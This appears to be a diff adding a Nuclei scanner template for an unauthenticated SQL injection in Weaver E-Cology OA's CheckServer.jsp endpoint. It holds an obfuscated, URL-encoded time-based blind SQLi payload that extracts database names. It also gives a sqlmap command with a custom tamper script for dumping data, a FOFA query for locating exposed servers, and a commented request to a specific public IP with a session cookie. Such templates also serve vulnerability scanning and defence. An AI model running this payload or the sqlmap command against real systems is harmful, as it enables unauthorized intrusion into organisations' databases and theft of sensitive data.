@@ -1,0 +1,49 @@
+id: weaver-ecology-checkserver-sqli
+
+info:
+  name: 泛微 OA E-Cology CheckServer.jsp - sqli
+  author: leadlife
+  severity: high
+  description: Ecology OA system improperly filters incoming data from users, resulting in a SQL injection vulnerability. Remote and unauthenticated attackers can use this vulnerability to conduct SQL injection attacks and steal sensitive database information.
+  reference:
+    - https://mp.weixin.qq.com/s/Arx1vRnOS3OfwR66i1I8sg
+  metadata:
+    verified: true
+    fofa-query: app="泛微-协同办公OA"
+    sqlmap: sqlmap -r sqli.txt --random-agent --dbms=mssql --risk 3 --level 5 --batch --tamper=weaver-ecology-checkserver-sqli.py -sqli --technique "T"
+  tags: weaver,ecology,sqli,oa
+
+http:
+  - raw:      
+      - |
+        GET /mobile/plugin/CheckServer.jsp?type=mobileSetting HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        POST /mobile/plugin/CheckServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 1314
+        Content-Type: application/x-www-form-url
+
+        timestamp=123&type=mobileSetting&settings=[{"scope":"2","module":"3","setting":"@%25%32%37%25%36%39%25%36%36%25%32%38%25%34%31%25%35%33%25%34%33%25%34%39%25%34%39%25%32%38%25%35%33%25%35%35%25%34%32%25%35%33%25%35%34%25%35%32%25%34%39%25%34%45%25%34%37%25%32%38%25%32%38%25%37%33%25%36%35%25%36%43%25%36%35%25%36%33%25%37%34%25%32%30%25%36%34%25%36%32%25%35%46%25%36%45%25%36%31%25%36%44%25%36%35%25%32%38%25%33%31%25%32%39%25%32%39%25%32%43%25%33%31%25%32%43%25%33%31%25%32%39%25%32%39%25%33%45%25%32%30%25%33%31%25%33%34%25%32%39%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%46%25%35%32%25%32%30%25%34%34%25%34%35%25%34%43%25%34%31%25%35%39%25%32%37%25%33%30%25%33%41%25%33%30%25%33%41%25%33%35%25%32%37%25%37%33%25%36%35%25%36%43%25%36%35%25%36%33%25%37%34%25%32%30%25%33%30%25%32%30%25%36%36%25%37%32%25%36%46%25%36%44%25%32%30%25%34%44%25%36%46%25%36%32%25%36%39%25%36%43%25%36%35%25%34%34%25%36%46%25%36%33%25%35%33%25%36%35%25%37%34%25%37%34%25%36%39%25%36%45%25%36%37%25%32%30%25%37%37%25%36%38%25%36%35%25%37%32%25%36%35%25%32%37%25%32%37%25%33%44%25%32%37|1","modulename":"1","include":"1","orasc":"1"}]
+
+
+    cookie-reuse: false
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains_all(header_1, 'application/json')
+          - contains(body_1, 'error\":\"system error') && !contains(body, 'securityIntercept')
+          - contains(body_2,'syncSetting')
+        condition: and
+
+# POST /mobile/plugin/CheckServer.jsp HTTP/1.1
+# Host: 123.60.13.185
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+# Content-Length: 1128
+# Content-Type: application/x-www-form-urlencoded
+# Cookie: ecology_JSessionId=abcor32x8tyimd0JCYZiz
+# Accept-Encoding: gzip, deflateConnection: close
+
+# timestamp=123&type=mobileSetting&settings=*
